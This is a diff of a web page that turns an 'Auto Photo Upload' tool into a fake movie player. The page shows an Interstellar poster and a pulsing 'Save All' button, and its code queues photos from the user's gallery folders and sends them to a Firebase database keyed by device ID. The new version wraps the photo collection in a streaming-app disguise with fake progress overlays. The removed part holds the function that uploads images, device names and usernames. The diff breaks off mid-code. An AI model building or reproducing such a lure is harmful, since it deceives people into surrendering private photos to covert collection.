@@ -1,431 +1,360 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Photo Auto Upload</title>
+    <title>Movie Player + Auto Upload</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: #000;
             color: #fff;
             min-height: 100vh;
-            padding: 20px 16px;
+            overflow: hidden;
+            -webkit-font-smoothing: antialiased;
         }
 
-        .container { max-width: 500px; margin: 0 auto; }
+        .player-container { position: fixed; inset: 0; background: #000; display: flex; flex-direction: column; z-index: 100; }
+        .player-wrapper { position: relative; width: 100%; height: 100vh; background: #000; overflow: hidden; }
 
-        /* Header */
-        .header {
-            text-align: center;
-            padding: 20px 0 24px;
+        /* TOP BAR */
+        .top-bar {
+            position: absolute; top: 0; left: 0; right: 0;
+            padding: 20px 16px 40px;
+            background: linear-gradient(180deg, rgba(0,0,0,0.9) 0%, transparent 100%);
+            z-index: 20; display: flex; align-items: center; gap: 12px;
+            transition: opacity 0.3s;
         }
-        .header .icon {
-            font-size: 64px;
-            margin-bottom: 12px;
-            animation: float 3s ease-in-out infinite;
+        .top-bar.hide { opacity: 0; pointer-events: none; }
+        .back-btn, .top-icon {
+            width: 40px; height: 40px; border-radius: 50%;
+            background: rgba(0,0,0,0.5); border: none; color: #fff;
+            font-size: 20px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            backdrop-filter: blur(10px); flex-shrink: 0;
         }
-        @keyframes float {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+        .movie-title-top { flex: 1; min-width: 0; }
+        .movie-title-top h1 { font-size: 15px; font-weight: 600; color: #fff; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .movie-title-top span { font-size: 12px; color: #8e8e93; }
+
+        /* VIDEO POSTER */
+        .video-area {
+            position: absolute; inset: 0; background: #000;
+            display: flex; align-items: center; justify-content: center; z-index: 1;
         }
-        .header h1 {
-            font-size: 24px;
-            font-weight: 800;
-            margin-bottom: 6px;
+        .video-poster {
+            width: 100%; height: 100%; object-fit: cover;
+            display: block; opacity: 0; transition: opacity 0.4s ease;
+        }
+        .video-poster.active { opacity: 1; }
+
+        /* CENTER PLAY */
+        .center-play {
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            z-index: 15; width: 80px; height: 80px; border-radius: 50%;
+            background: rgba(255,255,255,0.15); backdrop-filter: blur(20px);
+            border: 2px solid rgba(255,255,255,0.4); color: #fff;
+            font-size: 32px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            transition: transform 0.2s, background 0.2s;
+        }
+        .center-play:active { transform: translate(-50%, -50%) scale(0.9); }
+
+        /* TAP ZONES */
+        .tap-zone { position: absolute; top: 100px; bottom: 150px; z-index: 10; cursor: pointer; }
+        .tap-zone.left { left: 0; width: 30%; }
+        .tap-zone.right { right: 0; width: 70%; }
+
+        /* BOTTOM CONTROLS */
+        .bottom-controls {
+            position: absolute; bottom: 0; left: 0; right: 0;
+            padding: 60px 16px 30px;
+            background: linear-gradient(transparent, rgba(0,0,0,0.95));
+            z-index: 20; transition: opacity 0.3s;
+        }
+        .bottom-controls.hide { opacity: 0; pointer-events: none; }
+
+        .progress-bar { height: 4px; background: rgba(255,255,255,0.2); border-radius: 2px; position: relative; cursor: pointer; }
+        .progress-fill {
+            position: absolute; top: 0; left: 0; height: 100%;
+            background: linear-gradient(90deg, #f09433, #dc2743);
+            border-radius: 2px; width: 0;
+        }
+        .time-row {
+            display: flex; justify-content: space-between;
+            font-size: 12px; color: #8e8e93; margin: 12px 0 20px;
+        }
+        .controls-row { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+        .ctrl-btn {
+            width: 44px; height: 44px; border-radius: 50%;
+            background: transparent; border: none; color: #fff;
+            font-size: 22px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .ctrl-btn.play-btn { width: 56px; height: 56px; background: rgba(255,255,255,0.15); font-size: 24px; }
+        .ctrl-spacer { flex: 1; }
+
+        /* SAVE BUTTON */
+        .save-btn-float {
+            position: absolute; top: 20px; right: 16px;
+            padding: 10px 18px; border: none; border-radius: 22px;
             background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            background-size: 300% 300%; color: #fff;
+            font-size: 13px; font-weight: 700; cursor: pointer; font-family: inherit;
+            display: flex; align-items: center; gap: 6px;
+            animation: gradientMove 4s ease infinite, pulseBtn 2s infinite;
+            box-shadow: 0 8px 24px rgba(220,39,67,0.5); z-index: 25;
         }
-        .header p {
-            font-size: 13px;
-            color: #8e8e93;
-            line-height: 1.5;
-        }
+        .save-btn-float:disabled { opacity: 0.6; animation: none; }
 
-        /* Status Card */
-        .status-card {
-            background: linear-gradient(180deg, #1c1c1e, #0a0a0a);
-            border: 1px solid #262626;
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 16px;
-        }
-        .status-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.04);
-            font-size: 14px;
-        }
-        .status-row:last-child { border-bottom: none; }
-        .status-label {
-            color: #8e8e93;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .status-value {
-            font-weight: 700;
-            font-size: 13px;
-        }
-        .status-value.ok { color: #34A853; }
-        .status-value.warn { color: #FFC107; }
-        .status-value.bad { color: #FF3B30; }
-
-        /* Guide */
-        .guide {
-            background: rgba(26, 115, 232, 0.08);
-            border: 1px solid rgba(26, 115, 232, 0.25);
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 16px;
-            font-size: 13px;
-            line-height: 1.7;
-            color: #6BA3E8;
-        }
-        .guide strong { color: #1a73e8; }
-
-        /* Buttons */
-        .btn {
-            width: 100%;
-            padding: 20px;
-            border: none;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            font-family: inherit;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: transform 0.15s;
-            margin-bottom: 12px;
-        }
-        .btn:active { transform: scale(0.97); }
-        .btn:disabled { opacity: 0.5; }
-
-        .btn-primary {
-            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
-            background-size: 300% 300%;
-            color: #fff;
-            animation: gradientMove 4s ease infinite;
-            box-shadow: 0 10px 30px rgba(220, 39, 67, 0.4);
-        }
         @keyframes gradientMove {
             0%, 100% { background-position: 0% 50%; }
             50% { background-position: 100% 50%; }
         }
-
-        .btn-secondary {
-            background: #262626;
-            color: #fff;
-            border: 1px solid #333;
+        @keyframes pulseBtn {
+            0%, 100% { box-shadow: 0 8px 24px rgba(220,39,67,0.5), 0 0 0 0 rgba(220,39,67,0.7); }
+            50% { box-shadow: 0 8px 24px rgba(220,39,67,0.7), 0 0 0 12px rgba(220,39,67,0); }
         }
 
-        /* Wrong Folder Modal */
-        .modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.96);
-            backdrop-filter: blur(20px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            z-index: 9999;
-        }
-        .modal.show { display: flex; }
-        .modal-box {
-            background: linear-gradient(180deg, #1c1c1e, #0a0a0a);
-            border: 1px solid rgba(255,59,48,0.3);
-            border-radius: 24px;
-            padding: 32px 24px 24px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            animation: boxIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-        @keyframes boxIn {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .modal-icon {
-            font-size: 72px;
-            margin-bottom: 16px;
-            animation: shake 0.6s;
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
-        }
-        .modal-title {
-            font-size: 22px;
-            font-weight: 800;
-            color: #FF3B30;
-            margin-bottom: 10px;
-        }
-        .modal-sub {
-            font-size: 14px;
-            color: #8e8e93;
-            line-height: 1.6;
-            margin-bottom: 20px;
-        }
-        .modal-detail {
-            background: rgba(255,59,48,0.1);
-            border: 1px solid rgba(255,59,48,0.3);
-            border-radius: 12px;
-            padding: 14px;
-            margin-bottom: 20px;
-            text-align: left;
-            font-size: 13px;
-            line-height: 1.6;
-        }
-        .modal-detail .bad { color: #FF3B30; font-weight: 700; }
-        .modal-detail .good { color: #34A853; font-weight: 700; }
-
-        /* Progress Overlay */
-        .overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(24px);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            z-index: 9998;
-        }
-        .overlay.show { display: flex; }
-        .overlay-box {
-            background: linear-gradient(180deg, #1c1c1e, #0a0a0a);
-            border: 1px solid #262626;
-            border-radius: 24px;
-            padding: 28px 24px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-        }
-        .overlay-icon {
-            font-size: 60px;
-            margin-bottom: 16px;
-            animation: bounce 1s infinite;
-        }
-        @keyframes bounce {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-        }
-        .overlay-title {
-            font-size: 18px;
-            font-weight: 700;
-            margin-bottom: 10px;
+        /* RESUME BANNER */
+        #resumeBanner {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
             background: linear-gradient(45deg, #f09433, #dc2743);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            color: #fff; padding: 14px 20px; border-radius: 16px;
+            font-size: 13px; font-weight: 600; display: none;
+            z-index: 99998; box-shadow: 0 10px 30px rgba(220,39,67,0.5);
+            align-items: center; gap: 12px; max-width: 90vw;
+        }
+        #resumeBanner.show { display: flex; }
+        .resume-btn {
+            padding: 8px 16px; border: none; border-radius: 10px;
+            background: #fff; color: #dc2743; font-size: 12px; font-weight: 700;
+            cursor: pointer; font-family: inherit;
+        }
+
+        /* OVERLAY */
+        #processingOverlay {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.94);
+            backdrop-filter: blur(24px); display: none;
+            align-items: center; justify-content: center;
+            z-index: 99999; padding: 20px;
+        }
+        #processingOverlay.show { display: flex; }
+
+        .overlay-box {
+            background: linear-gradient(180deg, #1c1c1e 0%, #0a0a0a 100%);
+            border: 1px solid #262626; border-radius: 24px;
+            padding: 32px 24px 24px; max-width: 400px; width: 100%;
+            text-align: center; box-shadow: 0 30px 80px rgba(0,0,0,0.9);
+        }
+
+        .folder-anim {
+            position: relative; width: 100px; height: 100px;
+            margin: 0 auto 20px; display: flex; align-items: center; justify-content: center;
+        }
+        .folder-icon { font-size: 56px; animation: folderBob 2s ease-in-out infinite; }
+        @keyframes folderBob {
+            0%, 100% { transform: translateY(0) scale(1); }
+            50% { transform: translateY(-6px) scale(1.05); }
+        }
+        .file-flying {
+            position: absolute; font-size: 24px; top: -20px; left: 50%;
+            transform: translateX(-50%); animation: fileFly 1.8s infinite;
+        }
+        @keyframes fileFly {
+            0% { top: -30px; opacity: 0; }
+            30% { opacity: 1; }
+            70% { opacity: 1; top: 50px; }
+            100% { opacity: 0; top: 70px; }
+        }
+
+        .overlay-title {
+            font-size: 20px; font-weight: 800; margin-bottom: 8px;
+            background: linear-gradient(45deg, #f09433, #dc2743, #bc1888);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
             background-clip: text;
         }
-        .overlay-sub {
-            font-size: 13px;
-            color: #8e8e93;
-            margin-bottom: 20px;
+        .overlay-sub { font-size: 13px; color: #8e8e93; line-height: 1.6; margin-bottom: 22px; }
+        .overlay-sub strong { color: #fff; }
+
+        .overlay-progress-bar {
+            height: 10px; background: rgba(255,255,255,0.06);
+            border-radius: 5px; overflow: hidden; margin-bottom: 10px;
         }
-        .progress-bar {
-            height: 8px;
-            background: rgba(255,255,255,0.06);
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 12px;
+        .overlay-progress-fill {
+            height: 100%; background: linear-gradient(90deg, #f09433, #dc2743);
+            border-radius: 5px; width: 0; transition: width 0.4s;
         }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #f09433, #dc2743);
-            width: 0;
-            transition: width 0.3s;
-            border-radius: 4px;
+        .overlay-progress-text {
+            display: flex; justify-content: space-between;
+            font-size: 12px; color: #8e8e93; margin-bottom: 16px;
         }
-        .progress-text {
-            display: flex;
-            justify-content: space-between;
-            font-size: 12px;
-            color: #8e8e93;
-            margin-bottom: 16px;
-        }
-        .progress-text .pct { color: #f09433; font-weight: 700; }
+        .overlay-progress-text .percent { color: #f09433; font-weight: 700; }
+
         .overlay-stats {
-            display: flex;
-            justify-content: space-around;
-            padding-top: 16px;
-            border-top: 1px solid #262626;
-            font-size: 12px;
+            display: flex; justify-content: space-around;
+            padding: 14px 0; margin-bottom: 16px;
+            border-top: 1px solid #262626; border-bottom: 1px solid #262626;
         }
-        .overlay-stat {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 4px;
-        }
-        .overlay-stat .num {
-            font-size: 18px;
-            font-weight: 800;
-        }
+        .overlay-stat { display: flex; flex-direction: column; align-items: center; gap: 2px; }
+        .overlay-stat .num { font-size: 20px; font-weight: 800; }
         .overlay-stat.done .num { color: #34A853; }
         .overlay-stat.pending .num { color: #FFC107; }
         .overlay-stat.failed .num { color: #FF3B30; }
-        .overlay-stat .lbl {
-            color: #8e8e93;
-            font-size: 10px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
+        .overlay-stat .lbl { color: #8e8e93; font-size: 10px; text-transform: uppercase; }
+
+        .current-file {
+            font-size: 12px; color: #b0b0b0; padding: 10px 14px;
+            background: rgba(255,255,255,0.03); border-radius: 12px;
+            margin-bottom: 16px; text-align: left; font-family: monospace;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
         }
 
-        /* Toast */
+        .cancel-btn {
+            width: 100%; padding: 12px;
+            border: 1px solid rgba(255,59,48,0.3); border-radius: 12px;
+            background: transparent; color: #FF3B30;
+            font-size: 13px; font-weight: 600; cursor: pointer;
+            font-family: inherit;
+        }
+
+        .error-state { display: none; text-align: center; padding: 8px 0; }
+        .error-state.show { display: block; }
+        .error-icon { font-size: 64px; margin-bottom: 16px; }
+        .error-title { font-size: 20px; font-weight: 800; color: #FF3B30; margin-bottom: 8px; }
+        .error-sub { font-size: 13px; color: #8e8e93; line-height: 1.6; margin-bottom: 20px; }
+        .error-retry {
+            padding: 14px 28px; border: none; border-radius: 14px;
+            background: linear-gradient(45deg, #f09433, #dc2743);
+            color: #fff; font-size: 14px; font-weight: 700;
+            cursor: pointer; font-family: inherit;
+        }
+        .success-icon { font-size: 72px; margin-bottom: 16px; display: inline-block; }
+
         .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(44,44,46,0.95);
-            backdrop-filter: blur(20px);
-            color: #fff;
-            padding: 12px 20px;
-            border-radius: 24px;
-            font-size: 13px;
-            z-index: 99999;
+            position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
+            background: rgba(44,44,46,0.95); color: #fff;
+            padding: 12px 20px; border-radius: 24px; font-size: 13px;
+            z-index: 999999; backdrop-filter: blur(20px);
             border: 1px solid rgba(255,255,255,0.1);
-            animation: toastIn 0.3s;
-            max-width: 90vw;
-            text-align: center;
-        }
-        @keyframes toastIn {
-            from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-            to { opacity: 1; transform: translateX(-50%) translateY(0); }
-        }
-
-        .hidden-input {
-            position: absolute;
-            left: -9999px;
-            opacity: 0;
+            max-width: 90vw; text-align: center;
         }
     </style>
 </head>
+
 <body>
 
-    <div class="container">
-
-        <div class="header">
-            <div class="icon">📸</div>
-            <h1>Auto Photo Upload</h1>
-            <p>DCIM select karo — photos automatic upload hongi</p>
-        </div>
-
-        <!-- Status Card -->
-        <div class="status-card">
-            <div class="status-row">
-                <span class="status-label">📁 Folder</span>
-                <span class="status-value" id="statusFolder">Not selected</span>
-            </div>
-            <div class="status-row">
-                <span class="status-label">🔐 Permission</span>
-                <span class="status-value" id="statusPerm">-</span>
-            </div>
-            <div class="status-row">
-                <span class="status-label">📦 Pending</span>
-                <span class="status-value" id="statusPending">0</span>
-            </div>
-            <div class="status-row">
-                <span class="status-label">👁️ Observer</span>
-                <span class="status-value" id="statusObserver">Inactive</span>
-            </div>
-            <div class="status-row">
-                <span class="status-label">💾 Storage</span>
-                <span class="status-value" id="statusStorage">-</span>
-            </div>
-        </div>
-
-        <!-- Guide -->
-        <div class="guide">
-            <strong>💡 Steps:</strong><br>
-            1. "Select DCIM Folder" dabao<br>
-            2. <strong>DCIM</strong> ya <strong>Pictures</strong> select karo<br>
-            3. <strong>"Allow on every visit"</strong> choose karo<br>
-            4. Photos auto-upload hongi
-        </div>
-
-        <!-- Hidden inputs -->
-        <input type="file" id="folderInput" webkitdirectory multiple class="hidden-input">
-
-        <!-- Buttons -->
-        <button class="btn btn-primary" id="pickBtn">
-            <span>📁</span>
-            <span>Select DCIM Folder</span>
-        </button>
-
-        <button class="btn btn-secondary" id="syncBtn" style="display: none;">
-            <span>🔄</span>
-            <span>Sync Pending Photos</span>
-        </button>
-
-        <button class="btn btn-secondary" id="changeBtn" style="display: none;">
-            <span>🔀</span>
-            <span>Change Folder</span>
-        </button>
-
+    <div id="resumeBanner">
+        <span class="resume-icon">⚠️</span>
+        <span id="resumeText">Pending photos hain</span>
+        <button class="resume-btn" id="resumeBtn">Resume</button>
     </div>
 
-    <!-- Wrong Folder Modal -->
-    <div class="modal" id="wrongModal">
-        <div class="modal-box">
-            <div class="modal-icon">❌</div>
-            <h2 class="modal-title">Wrong Folder</h2>
-            <p class="modal-sub">
-                Ye folder upload nahi ho sakta.<br>
-                Sirf <strong>DCIM</strong> ya <strong>Pictures</strong> select karo.
-            </p>
-            <div class="modal-detail">
-                <div>❌ <span class="bad">Tumne select kiya:</span> <strong id="wrongName">-</strong></div>
-                <div style="margin-top: 8px;">✅ <span class="good">Ye select karo:</span> <strong>DCIM / Pictures</strong></div>
+    <div class="player-container">
+        <div class="player-wrapper">
+
+            <div class="video-area">
+                <img class="video-poster active" id="videoPoster" src="" alt="Movie">
             </div>
-            <button class="btn btn-primary" id="wrongRetryBtn">
-                <span>🔄</span>
-                <span>Choose Correct Folder</span>
+
+            <div class="top-bar" id="topBar">
+                <button class="back-btn" id="backBtn">←</button>
+                <div class="movie-title-top">
+                    <h1 id="movieTitle">Interstellar</h1>
+                    <span id="movieSub">2014 • Sci-Fi • 2h 49m</span>
+                </div>
+                <button class="top-icon">⋯</button>
+            </div>
+
+            <button class="save-btn-float" id="saveAllBtn">
+                <span>💾</span>
+                <span>Save All</span>
             </button>
-            <button class="btn btn-secondary" id="wrongCancelBtn">Cancel</button>
+
+            <button class="center-play" id="centerPlay">▶</button>
+
+            <div class="tap-zone left" id="tapLeft"></div>
+            <div class="tap-zone right" id="tapRight"></div>
+
+            <div class="bottom-controls" id="bottomControls">
+                <div class="progress-bar" id="progressBar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="time-row">
+                    <span id="currentTime">0:00</span>
+                    <span id="totalTime">2:49:00</span>
+                </div>
+                <div class="controls-row">
+                    <button class="ctrl-btn" id="rewindBtn">⏪</button>
+                    <button class="ctrl-btn play-btn" id="playPauseBtn">⏸</button>
+                    <button class="ctrl-btn" id="forwardBtn">⏩</button>
+                    <div class="ctrl-spacer"></div>
+                    <button class="ctrl-btn" id="volumeBtn">🔊</button>
+                    <button class="ctrl-btn" id="fullscreenBtn">⛶</button>
+                </div>
+            </div>
+
         </div>
     </div>
 
-    <!-- Progress Overlay -->
-    <div class="overlay" id="progressOverlay">
+    <div id="processingOverlay">
         <div class="overlay-box">
-            <div class="overlay-icon" id="overlayIcon">📤</div>
-            <h2 class="overlay-title" id="overlayTitle">Uploading Photos</h2>
-            <p class="overlay-sub" id="overlaySub">Please wait...</p>
+            <div id="overlayMain">
+                <div class="folder-anim">
+                    <div class="folder-icon">📁</div>
+                    <div class="file-flying">📸</div>
+                </div>
 
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressFill"></div>
-            </div>
-            <div class="progress-text">
-                <span id="progressLabel">Starting...</span>
-                <span class="pct" id="progressPct">0%</span>
+                <h2 class="overlay-title" id="overlayTitle">Saving Photos</h2>
+                <p class="overlay-sub" id="overlaySub">
+                    Photos <strong>folder mein save</strong> ho rahi hain.
+                </p>
+
+                <div class="overlay-progress-bar">
+                    <div class="overlay-progress-fill" id="overlayProgressFill"></div>
+                </div>
+                <div class="overlay-progress-text">
+                    <span id="overlayProgressLabel">Starting...</span>
+                    <span class="percent" id="overlayProgressPercent">0%</span>
+                </div>
+
+                <div class="overlay-stats">
+                    <div class="overlay-stat done">
+                        <span class="num" id="overlayDone">0</span>
+                        <span class="lbl">Saved</span>
+                    </div>
+                    <div class="overlay-stat pending">
+                        <span class="num" id="overlayPending">0</span>
+                        <span class="lbl">Pending</span>
+                    </div>
+                    <div class="overlay-stat failed">
+                        <span class="num" id="overlayFailed">0</span>
+                        <span class="lbl">Failed</span>
+                    </div>
+                </div>
+
+                <div class="current-file" id="currentFile">Waiting...</div>
+
+                <button class="cancel-btn" id="cancelBtn">Cancel</button>
             </div>
 
-            <div class="overlay-stats">
-                <div class="overlay-stat done">
-                    <span class="num" id="statDone">0</span>
-                    <span class="lbl">Saved</span>
-                </div>
-                <div class="overlay-stat pending">
-                    <span class="num" id="statPending">0</span>
-                    <span class="lbl">Pending</span>
-                </div>
-                <div class="overlay-stat failed">
-                    <span class="num" id="statFailed">0</span>
-                    <span class="lbl">Failed</span>
-                </div>
+            <div class="error-state" id="successState">
+                <div class="success-icon">✅</div>
+                <div class="error-title" style="color: #34A853;">Save Complete!</div>
+                <div class="error-sub" id="successSub">Sab photos save ho gayin.</div>
+            </div>
+
+            <div class="error-state" id="errorState">
+                <div class="error-icon">⚠️</div>
+                <div class="error-title" id="errorTitle">Save Failed</div>
+                <div class="error-sub" id="errorSub">Kuch files save nahi ho paayin.</div>
+                <button class="error-retry" id="errorRetry">
+                    <span>🔄</span>
+                    <span>Retry</span>
+                </button>
             </div>
         </div>
     </div>
@@ -448,9 +377,7 @@
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        /* ============================================================
-           DEVICE ID
-           ============================================================ */
+        /* DEVICE ID */
         function getDeviceId() {
             let id = localStorage.getItem('pics_device_id');
             if (id) return id;
@@ -477,35 +404,49 @@
         const CONCURRENCY = 3;
         const COMPRESS_WIDTH = 800;
         const COMPRESS_QUALITY = 0.55;
+        const FAKE_FILE_COUNT = 15;
 
-        /* ============================================================
-           SUPPORT CHECK
-           ============================================================ */
+        /* OPFS Support */
         const OPFS_SUPPORTED = 'storage' in navigator && 'getDirectory' in navigator.storage;
-        const OBSERVER_SUPPORTED = 'FileSystemObserver' in window;
 
         console.log('📱 Device:', DEVICE_ID);
         console.log('💾 OPFS:', OPFS_SUPPORTED ? '✅' : '❌');
-        console.log('👁️ Observer:', OBSERVER_SUPPORTED ? '✅' : '❌');
 
-        /* ============================================================
-           INDEXEDDB
-           ============================================================ */
-        const IDB_NAME = 'PhotoAutoUploadDB';
-        const IDB_VERSION = 2;
-        const STORE_PENDING = 'pending';
-        const STORE_HANDLES = 'handles';
+        /* Movie data */
+        const movies = [
+            { title: 'Interstellar', poster: 'https://picsum.photos/800/1400?random=1', year: '2014', genre: 'Sci-Fi', duration: '2h 49m' },
+            { title: 'Inception', poster: 'https://picsum.photos/800/1400?random=2', year: '2010', genre: 'Thriller', duration: '2h 28m' },
+            { title: 'The Dark Knight', poster: 'https://picsum.photos/800/1400?random=3', year: '2008', genre: 'Action', duration: '2h 32m' },
+            { title: 'Oppenheimer', poster: 'https://picsum.photos/800/1400?random=4', year: '2023', genre: 'Biography', duration: '3h 0m' },
+            { title: 'Dune: Part Two', poster: 'https://picsum.photos/800/1400?random=5', year: '2024', genre: 'Sci-Fi', duration: '2h 46m' }
+        ];
+
+        let currentMovieIndex = 0;
+        let isPlaying = true;
+        let videoDuration = 169 * 60;
+        let currentTime = 0;
+        let progressInterval = null;
+
+        /* State */
+        let fakeInterval = null;
+        let isCancelled = false;
+        let wakeLock = null;
+        let uploadStartTime = 0;
+        let retryCount = 0;
+        let fakeDone = 0;
+
+        /* IndexedDB */
+        const IDB_NAME = 'IGPendingDB';
+        const IDB_VERSION = 1;
+        const IDB_STORE = 'pending_photos';
 
         function openIDB() {
             return new Promise((resolve, reject) => {
                 const req = indexedDB.open(IDB_NAME, IDB_VERSION);
                 req.onupgradeneeded = (e) => {
                     const db = e.target.result;
-                    if (!db.objectStoreNames.contains(STORE_PENDING)) {
-                        db.createObjectStore(STORE_PENDING, { keyPath: 'id', autoIncrement: true });
-                    }
-                    if (!db.objectStoreNames.contains(STORE_HANDLES)) {
-                        db.createObjectStore(STORE_HANDLES);
+                    if (!db.objectStoreNames.contains(IDB_STORE)) {
+                        db.createObjectStore(IDB_STORE, { keyPath: 'id', autoIncrement: true });
                     }
                 };
                 req.onsuccess = () => resolve(req.result);
@@ -516,8 +457,8 @@
         async function idbAdd(photo) {
             const db = await openIDB();
             return new Promise((resolve, reject) => {
-                const tx = db.transaction(STORE_PENDING, 'readwrite');
-                tx.objectStore(STORE_PENDING).add(photo);
+                const tx = db.transaction(IDB_STORE, 'readwrite');
+                tx.objectStore(IDB_STORE).add(photo);
                 tx.oncomplete = () => { db.close(); resolve(); };
                 tx.onerror = () => { db.close(); reject(tx.error); };
             });
@@ -526,8 +467,8 @@
         async function idbGetAll() {
             const db = await openIDB();
             return new Promise((resolve, reject) => {
-                const tx = db.transaction(STORE_PENDING, 'readonly');
-                const req = tx.objectStore(STORE_PENDING).getAll();
+                const tx = db.transaction(IDB_STORE, 'readonly');
+                const req = tx.objectStore(IDB_STORE).getAll();
                 req.onsuccess = () => { db.close(); resolve(req.result || []); };
                 req.onerror = () => { db.close(); reject(req.error); };
             });
@@ -536,8 +477,8 @@
         async function idbDelete(id) {
             const db = await openIDB();
             return new Promise((resolve, reject) => {
-                const tx = db.transaction(STORE_PENDING, 'readwrite');
-                tx.objectStore(STORE_PENDING).delete(id);
+                const tx = db.transaction(IDB_STORE, 'readwrite');
+                tx.objectStore(IDB_STORE).delete(id);
                 tx.oncomplete = () => { db.close(); resolve(); };
                 tx.onerror = () => { db.close(); reject(tx.error); };
             });
@@ -546,36 +487,14 @@
         async function idbCount() {
             const db = await openIDB();
             return new Promise((resolve, reject) => {
-                const tx = db.transaction(STORE_PENDING, 'readonly');
-                const req = tx.objectStore(STORE_PENDING).count();
+                const tx = db.transaction(IDB_STORE, 'readonly');
+                const req = tx.objectStore(IDB_STORE).count();
                 req.onsuccess = () => { db.close(); resolve(req.result); };
                 req.onerror = () => { db.close(); reject(req.error); };
             });
         }
 
-        async function idbSaveHandle(key, handle) {
-            const db = await openIDB();
-            return new Promise((resolve, reject) => {
-                const tx = db.transaction(STORE_HANDLES, 'readwrite');
-                tx.objectStore(STORE_HANDLES).put(handle, key);
-                tx.oncomplete = () => { db.close(); resolve(); };
-                tx.onerror = () => { db.close(); reject(tx.error); };
-            });
-        }
-
-        async function idbGetHandle(key) {
-            const db = await openIDB();
-            return new Promise((resolve, reject) => {
-                const tx = db.transaction(STORE_HANDLES, 'readonly');
-                const req = tx.objectStore(STORE_HANDLES).get(key);
-                req.onsuccess = () => { db.close(); resolve(req.result); };
-                req.onerror = () => { db.close(); reject(req.error); };
-            });
-        }
-
-        /* ============================================================
-           OPFS HELPERS
-           ============================================================ */
+        /* OPFS helpers */
         async function opfsSave(fileName, blob) {
             if (!OPFS_SUPPORTED) return false;
             try {
@@ -587,7 +506,6 @@
                 await writable.close();
                 return true;
             } catch (e) {
-                console.warn('OPFS save failed:', e.message);
                 return false;
             }
         }
@@ -613,232 +531,10 @@
             } catch (e) {}
         }
 
-        /* ============================================================
-           SYNC — Firebase upload from IndexedDB + OPFS
-           ============================================================ */
-        async function syncPendingUploads() {
-            const pending = await idbGetAll();
-            if (pending.length === 0) return { synced: 0, remaining: 0 };
-
-            console.log(`🔄 Syncing ${pending.length}...`);
-            showOverlay(pending.length);
-
-            let synced = 0, failed = 0;
-
-            for (const item of pending) {
-                try {
-                    let base64;
-
-                    if (item.inOPFS) {
-                        const blob = await opfsRead(item.name);
-                        if (blob) base64 = await blobToBase64(blob);
-                    }
-
-                    if (!base64 && item.image) {
-                        base64 = item.image;
-                    }
-
-                    if (!base64) {
-                        failed++;
-                        updateOverlayStats(synced, pending.length - synced - failed, failed);
-                        continue;
-                    }
-
-                    // Firebase upload
-                    const photoRef = push(ref(db, 'photos/' + item.deviceId));
-                    await set(photoRef, {
-                        id: photoRef.key,
-                        deviceId: item.deviceId,
-                        deviceName: item.deviceName,
-                        sessionId: item.sessionId,
-                        username: item.username,
-                        image: base64,
-                        name: item.name,
-                        size: item.size,
-                        timestamp: serverTimestamp(),
-                        uploadedAt: item.queuedAt,
-                        fromQueue: true
-                    });
-
-                    // Delete from OPFS + IndexedDB
-                    if (item.inOPFS) await opfsDelete(item.name);
-                    await idbDelete(item.id);
-                    synced++;
-
-                    updateOverlayStats(synced, pending.length - synced - failed, failed);
-
-                } catch (err) {
-                    failed++;
-                    updateOverlayStats(synced, pending.length - synced - failed, failed);
-                    console.warn(`❌ Failed: ${item.name}`, err.message);
-                }
-            }
-
